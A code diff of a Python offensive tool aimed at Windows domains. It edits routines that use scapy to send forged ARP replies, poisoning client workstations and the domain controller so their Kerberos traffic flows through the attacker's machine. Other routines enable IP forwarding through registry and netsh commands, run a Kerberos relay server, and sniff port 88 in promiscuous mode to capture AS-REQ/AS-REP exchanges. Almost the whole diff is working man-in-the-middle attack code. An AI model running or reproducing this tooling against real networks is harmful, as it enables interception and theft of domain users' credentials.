@@ -153,34 +153,6 @@ def setup_windows_networking():
         )
         rich_print_info(f"[SETUP] Current IP forwarding status checked", "blue")
         
-        # CRITICAL: Add special packet forwarding configuration for ARP spoofing
-        # These settings help ensure packets flow properly during MITM attacks
-        registry_result = subprocess.run([
-            'reg', 'add', 
-            'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
-            '/t', 'REG_DWORD', 
-            '/v', 'IPEnableRouter', 
-            '/d', '1', 
-            '/f'
-        ], capture_output=True, text=True)
-        
-        if registry_result.returncode == 0:
-            rich_print_success("[SETUP] ✓ Registry IP forwarding enabled - critical for ARP spoofing")
-        else:
-            rich_print_warning("[SETUP] Failed to set registry IP forwarding")
-        
-        # Optimize Windows network stack for MITM operations
-        try:
-            # Disable Large Send Offload (can interfere with packet forwarding)
-            subprocess.run(['netsh', 'int', 'tcp', 'set', 'global', 'chimney=disabled'], 
-                         capture_output=True, text=True, timeout=5)
-            # Set MTU to standard value to avoid fragmentation issues
-            subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'subinterface', iface, 'mtu=1500'], 
-                         capture_output=True, text=True, timeout=5)
-            rich_print_info("[SETUP] Network stack optimized for packet forwarding", "green")
-        except Exception as e:
-            rich_print_warning(f"[SETUP] Network optimization error: {e}")
-        
         # Enable IP forwarding on Windows
         try:
             subprocess.run(
@@ -862,112 +834,57 @@ def relaymode_arp_spoof(spoofed_ip):
     rich_print_info(f'[ARP RELAY] DC: {dc} ({dc_mac})', 'yellow')
     rich_print_info(f'[ARP RELAY] Interface: {iface}, Source MAC: {hwsrc}', 'yellow')
     
-    # Configure Windows packet forwarding - CRITICAL to do before ARP spoofing
-    try:
-        rich_print_info('[ARP RELAY] Setting up Windows packet forwarding...', 'yellow')
-        # Enable IP forwarding
-        subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'], 
-                     capture_output=True, text=True, timeout=10)
-        # Ensure packets aren't being filtered
-        subprocess.run(['netsh', 'advfirewall', 'set', 'global', 'statefulftp', 'disable'], 
-                     capture_output=True, text=True, timeout=10)
-        rich_print_success('[ARP RELAY] ✓ Packet forwarding configured for ARP spoofing')
-    except Exception as e:
-        rich_print_error(f'[ARP RELAY] Error configuring packet forwarding: {e}')
-    
-    # Do strong initial poisoning
-    rich_print_info('[ARP RELAY] Performing STRONG initial ARP poisoning...', 'yellow')
-    
-    # Prepare initial poisoning packets
-    packets_list = []
-    
-    # STEP 1: Poison CLIENT workstations (tell them DC is at our MAC)
-    for target in mac_addresses :
-        if stop_arp_spoofing_flag.is_set():
-            return
-        
-        # Tell client that DC is at our MAC address
-        packet = Ether(src=hwsrc, dst=mac_addresses[target]) / ARP(op=2, hwsrc=hwsrc, psrc=dc, hwdst=mac_addresses[target], pdst=target)
-        packets_list.append(packet)
-        
-        if debug:
-            rich_print_info(f'[ARP CLIENT] Poisoning {target}: telling them DC {dc} is at {hwsrc}', 'cyan')
-    
-    # STEP 2: Poison DC (tell it that ALL clients are at our MAC)
-    for target in mac_addresses:
-        if stop_arp_spoofing_flag.is_set():
-            return
-        
-        # Tell DC that each client is at our MAC address
-        packet = Ether(src=hwsrc, dst=dc_mac) / ARP(op=2, hwsrc=hwsrc, psrc=target, hwdst=dc_mac, pdst=dc)
-        packets_list.append(packet)
-        
-        if debug:
-            rich_print_info(f'[ARP DC] Poisoning DC: telling {dc} that client {target} is at {hwsrc}', 'cyan')
-    
-    # Send initial poisoning packets multiple times for reliability
-    if packets_list:
-        # Send 3 times with slight delay between batches for better reliability
-        for i in range(3):
-            rich_print_info(f'[ARP RELAY] Sending initial poison batch {i+1}/3...', 'yellow')
-            sendp(packets_list, iface=iface, verbose=False)
-            time.sleep(0.5)  # Brief delay between batches
-        
-        rich_print_success(f'[ARP RELAY] ✓ Initial poisoning complete ({len(packets_list)} packets x 3)')
-        rich_print_success(f'[ARP RELAY] ✓ Network traffic now flowing through this machine')
-    else:
-        rich_print_warning('[ARP RELAY] No packets to send - target list empty')
-    
-    # Now switch to periodic refresh with MUCH longer interval
-    rich_print_info('[ARP RELAY] Switching to low-frequency ARP refresh mode', 'blue')
-    rich_print_info('[ARP RELAY] This prevents cache expiration while minimizing network impact', 'blue')
-    
-    # ARP entries typically expire after 2-5 minutes, so refresh every 30 seconds
-    ARP_REFRESH_INTERVAL = 30  # seconds
-    
-    while not stop_arp_spoofing_flag.is_set():
-        # Sleep for most of the interval, but check stop flag frequently
-        start_time = time.time()
-        while time.time() - start_time < ARP_REFRESH_INTERVAL:
-            if stop_arp_spoofing_flag.is_set():
-                rich_print_info('[ARP RELAY] Stop flag detected, exiting ARP spoof thread', 'red')
-                return
-            time.sleep(0.5)  # Check flag twice per second
-        
-        # Time to refresh ARP cache
-        if stop_arp_spoofing_flag.is_set():
-            return
-            
-        # Update target list periodically
-        timer += 1
-        if timer >= 2:  # Update targets every 2 refresh cycles (60 seconds)
-            rich_print_info('[ARP RELAY] Updating target host list...', 'blue')
-            mac_addresses = update_uphosts()
-            timer = 0
-        
-        # Only if we have targets
-        if Targets != set():
+    while not stop_arp_spoofing_flag.is_set() :
+        if Targets != set() :
             packets_list = []
             
-            # Create refresh packets - same logic as initial poisoning but sent less frequently
+            # STEP 1: Poison CLIENT workstations (tell them DC is at our MAC)
+            # This captures AS-REQ packets going TO the DC
+            for target in mac_addresses :
+                if stop_arp_spoofing_flag.is_set():
+                    return
+                
+                # Tell client that DC is at our MAC address
+                packet = Ether(src=hwsrc, dst=mac_addresses[target]) / ARP(op=2, hwsrc=hwsrc, psrc=dc, hwdst=mac_addresses[target], pdst=target)
+                packets_list.append(packet)
+                
+                if debug:
+                    rich_print_info(f'[ARP CLIENT] Poisoning {target}: telling them DC {dc} is at {hwsrc}', 'cyan')
+            
+            # STEP 2: Poison DC (tell it that ALL clients are at our MAC)
+            # This captures AS-REP packets going FROM the DC
             for target in mac_addresses:
                 if stop_arp_spoofing_flag.is_set():
                     return
-                    
-                # Refresh client ARP cache (DC -> our MAC)
-                packets_list.append(Ether(src=hwsrc, dst=mac_addresses[target]) / 
-                                   ARP(op=2, hwsrc=hwsrc, psrc=dc, hwdst=mac_addresses[target], pdst=target))
                 
-                # Refresh DC ARP cache (client -> our MAC)
-                packets_list.append(Ether(src=hwsrc, dst=dc_mac) / 
-                                   ARP(op=2, hwsrc=hwsrc, psrc=target, hwdst=dc_mac, pdst=dc))
+                # Tell DC that each client is at our MAC address
+                packet = Ether(src=hwsrc, dst=dc_mac) / ARP(op=2, hwsrc=hwsrc, psrc=target, hwdst=dc_mac, pdst=dc)
+                packets_list.append(packet)
+                
+                if debug:
+                    rich_print_info(f'[ARP DC] Poisoning DC: telling {dc} that client {target} is at {hwsrc}', 'cyan')
             
-            # Send refresh packets once - no need for multiple sends during refresh
             if packets_list:
-                rich_print_info(f'[ARP RELAY] Refreshing ARP cache with {len(packets_list)} packets', 'blue')
+                rich_print_info(f'[ARP RELAY] Sending {len(packets_list)} bidirectional ARP spoof packets', 'yellow')
                 sendp(packets_list, iface=iface, verbose=False)
+                rich_print_success(f'[ARP RELAY] ✓ Sent {len(packets_list)} packets (clients + DC poisoned)', 'green')
             else:
-                rich_print_warning('[ARP RELAY] No packets to send during refresh - target list empty')
+                rich_print_warning('[ARP RELAY] No packets to send - target list empty')
+        else:
+            rich_print_warning('[ARP RELAY] No active targets for ARP spoofing')
+        
+        # Use shorter sleep and check stop flag more frequently
+        for _ in range(10):  # Check stop flag every 0.1 seconds instead of waiting 1 full second
+            if stop_arp_spoofing_flag.is_set():
+                rich_print_info('[ARP RELAY] Stop flag detected, exiting ARP spoof thread', 'red')
+                return
+            time.sleep(0.1)
+            
+        timer += 1
+        if timer == 3 :
+            rich_print_info('[ARP RELAY] Updating target host list...', 'blue')
+            mac_addresses = update_uphosts()
+            timer = 0
 
 def listenmode_arp_spoof():
     # CRITICAL: Use EXACT same method as working Linux version!
@@ -1720,48 +1637,12 @@ def relay_mode():
     rich_print_info('[RELAY] Reset stop flag - ensuring clean startup', 'cyan')
     
     try:
-        # 1. FIRST: Start the relay server to get ready to receive packets
-        # Start an async task to set up the relay server
-        relay_server_ready = threading.Event()
-        relay_server_failed = threading.Event()
-        
-        def start_relay_server():
-            try:
-                # Run the Kerberos server in the main thread
-                rich_print_info('[RELAY] Starting Kerberos relay server BEFORE ARP spoofing', 'green')
-                asyncio.run(kerberos_server())
-                relay_server_ready.set()  # Signal that server is ready
-            except Exception as e:
-                rich_print_error(f'[RELAY] Relay server failed to start: {e}')
-                relay_server_failed.set()
-        
-        # 2. SECOND: Only start ARP spoofing after relay server is ready
-        rich_print_info('[RELAY] Waiting for relay server to start before ARP spoofing...', 'yellow')
-        
-        # Start relay server in a separate thread
-        relay_thread = threading.Thread(target=start_relay_server)
-        relay_thread.daemon = True
-        relay_thread.start()
-        
-        # Wait for relay server to be ready or fail
-        start_time = time.time()
-        while not (relay_server_ready.is_set() or relay_server_failed.is_set()):
-            if time.time() - start_time > 30:  # 30 second timeout
-                rich_print_error('[RELAY] Relay server taking too long to start')
-                break
-            time.sleep(0.5)
-        
-        # 3. Start ARP spoofing only if relay server is ready and spoofing is enabled
-        if relay_server_ready.is_set() and not disable_spoofing:
-            rich_print_info('[RELAY] Relay server started, now launching ARP spoofer', 'green')
+        # Start ARP spoofing in background (if enabled)
+        if not disable_spoofing:
             thread = threading.Thread(target=relaymode_arp_spoof, args=(dc,))
             thread.daemon = True
             thread.start()
-            rich_print_info('[RELAY] ARP spoofing started in background', 'green')
-        elif relay_server_failed.set():
-            rich_print_error('[RELAY] Cannot start ARP spoofing - relay server failed to start')
-        elif disable_spoofing:
-            rich_print_info('[RELAY] ARP spoofing disabled by user', 'yellow')
+            rich_print_info('[+] ARP spoofing started in background', 'green')
         
         # CRITICAL: Try to import TCPSession for proper packet reassembly on Windows
         try:
@@ -1775,30 +1656,25 @@ def relay_mode():
         # Create a threading event to signal when to stop the sniffer
         stop_sniffer = threading.Event()
         
-        # Start packet sniffer in a separate thread, but with reduced activity
-        # This acts as a backup capture method in case some packets bypass our relay
+        # Start packet sniffer in a separate thread
         def run_sniffer():
-            rich_print_info('[RELAY] Starting BACKUP packet sniffer with TCP session support', 'green')
-            rich_print_info('[RELAY] This will only capture packets that bypass the relay server', 'yellow')
-            
-            # Give the relay server some time to start first
-            time.sleep(3)
+            rich_print_info('[RELAY] Starting parallel packet sniffer with TCP session support', 'green')
+            rich_print_info('[RELAY] This will capture and reassemble multi-segment Kerberos packets', 'yellow')
             
             try:
                 while not stop_sniffer.is_set():
                     try:
                         if tcp_session_available:
                             # Use TCPSession for proper TCP reassembly (critical for Kerberos over TCP)
-                            # But with much longer timeout and smaller count to reduce impact
                             sniff(
                                 filter="src port 88", 
                                 prn=parse_dc_response, 
                                 iface=iface, 
                                 store=False, 
                                 promisc=True, 
-                                session=TCPSession,  
-                                count=25,  # Reduced count to minimize network impact
-                                timeout=30  # Much longer timeout to reduce CPU usage
+                                session=TCPSession,  # CRITICAL: TCP packet reassembly
+                                count=50,  # Increased from 10 to reduce loop frequency
+                                timeout=10  # Increased from 2 to reduce CPU usage
                             )
                         else:
                             # Fallback without TCP session
@@ -1808,8 +1684,8 @@ def relay_mode():
                                 iface=iface, 
                                 store=False, 
                                 promisc=True, 
-                                count=25,  
-                                timeout=30  
+                                count=50,  # Increased from 10
+                                timeout=10  # Increased from 2
                             )
                         
                         # Add small sleep to prevent tight loop if sniff returns immediately
@@ -1829,27 +1705,14 @@ def relay_mode():
             except Exception as e:
                 rich_print_error(f'[RELAY] Error in packet sniffer: {e}')
         
-        # Start the sniffer thread only if relay server is ready
-        # This ensures we don't waste resources if the relay server failed
-        if relay_server_ready.is_set():
-            sniffer_thread = threading.Thread(target=run_sniffer)
-            sniffer_thread.daemon = True
-            sniffer_thread.start()
-            rich_print_success('[RELAY] Backup packet sniffer started successfully!')
-            rich_print_info('[RELAY] All systems operational: ARP spoofing + relay server + backup sniffer', 'green')
-        else:
-            rich_print_warning('[RELAY] Not starting backup sniffer - relay server failed to start')
+        # Start the sniffer thread
+        sniffer_thread = threading.Thread(target=run_sniffer)
+        sniffer_thread.daemon = True
+        sniffer_thread.start()
+        rich_print_success('[RELAY] Parallel packet sniffer started successfully!')
         
-        # Since we already started the Kerberos server in a thread, we just need to wait here
-        rich_print_info('[RELAY] Main thread waiting for activity...', 'blue')
-        # Wait until keyboard interrupt or signal
-        try:
-            while True:
-                # Main thread just keeps everything alive while threads do their work
-                time.sleep(1)
-        except KeyboardInterrupt:
-            rich_print_info('[RELAY] Keyboard interrupt detected in main thread', 'yellow')
-            raise
+        # Run the Kerberos relay server in the main thread
+        asyncio.run(kerberos_server())
         
     except KeyboardInterrupt:
         rich_print_info('\n[RELAY] Relay mode stopped by user', 'yellow')
